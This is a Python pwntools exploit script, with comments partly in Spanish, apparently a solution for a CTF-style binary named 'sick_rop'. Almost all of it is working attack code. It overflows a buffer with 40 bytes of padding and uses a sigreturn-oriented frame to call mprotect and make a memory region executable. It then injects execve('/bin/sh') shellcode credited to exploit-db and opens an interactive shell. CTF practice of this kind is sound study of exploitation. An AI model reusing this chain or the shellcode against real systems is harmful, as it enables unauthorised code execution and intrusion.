from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './sick_rop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Valores necesarios
syscall_ret = 0x401014 # Dirección del gadget: syscall; ret;
vuln_func = 0x40102e # Función que llama a read
vuln_pointer = 0x4010d8 # Puntero función vuln() [pwndbg> search -t pointer 0x40102e]
writable = 0x400000 # Posición donde se quiere escribir el payload

padding = 40
payload = b'A'*padding                # 40 is the offset to rip
payload += pack(vuln_func)         # for reading 15 bytes , saves 15 to rax
payload += pack(syscall_ret)          # syscall when rax holds 15 results to a sigreturn 

# our fake frame
# mprotect hará que en el rango 0x400000 a 0x410000 se pueda ejecutar código
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0xa # Valor corrspondiente a la syscall mprotect
frame.rdi = writable # Zona escribible, por ejemplo 0x400000
frame.rsi = 0x10000 # Tamaño de escritura, por ejemplo 0x10000
frame.rdx = 0x7 # es el modo (rwx)
frame.rsp = vuln_pointer   # Al restaurar la pila, se quiere volver a saltar a la función vuln. Se debe utilizar el puntero (pwndbg> search -t pointer 0x40102e)
frame.rip = syscall_ret # Se salta a mprotect

payload += bytes(frame) # fake sigreturnframe

# sending
io.sendline(payload)
io.recv()

payload = b"C"*15 # Se envian 15 C ya que es el valor de la syscall sigreturn
io.send(payload)
io.recv()

# shellcode https://www.exploit-db.com/exploits/42179
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
payload = flat(
    shellcode,
    asm('nop') * (padding - len(shellcode)),
    pack(0x4010b8) # 0x4010b8 es la dirección de inicio del shellcode
)

io.sendline(payload)
io.interactive()